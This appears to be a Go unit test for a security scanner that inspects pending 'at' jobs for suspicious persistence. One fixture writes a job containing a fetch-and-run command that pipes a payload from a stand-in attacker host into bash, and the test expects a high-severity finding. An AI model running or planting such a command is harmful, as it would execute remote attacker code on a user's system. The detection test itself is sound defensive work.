/*
©AngelaMos | 2026
atjob_test.go
*/

package scanner

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/CarterPerez-dev/sentinel/pkg/types"
)

func TestAtJobScanner_PendingJob(t *testing.T) {
	root := t.TempDir()
	spoolDir := filepath.Join(root, "var", "spool", "at")
	if err := os.MkdirAll(spoolDir, 0o750); err != nil {
		t.Fatal(err)
	}

	jobPath := filepath.Join(spoolDir, "pending-job")
	writeTestFile(
		t, jobPath,
		"#!/bin/sh\ncurl http://evil.example.com/payload | bash\n",
	)

	a := &AtJobScanner{}
	findings := a.Scan(root)

	if len(findings) == 0 {
		t.Fatal("at job spool with files produced no findings")
	}

	hasLow := false
	hasHigh := false
	for _, f := range findings {
		if f.Title == "Pending at job found" {
			hasLow = true
		}
		if f.Severity >= types.SeverityHigh {
			hasHigh = true
		}
	}

	if !hasLow {
		t.Error("expected 'Pending at job found' finding")
	}
	if !hasHigh {
		t.Error(
			"expected high+ finding for curl|bash in at job",
		)
	}
}

func TestAtJobScanner_EmptySpool(t *testing.T) {
	a := &AtJobScanner{}
	emptyRoot := t.TempDir()

	findings := a.Scan(emptyRoot)
	if len(findings) > 0 {
		t.Errorf(
			"empty spool produced %d findings, want 0",
			len(findings),
		)
	}
}
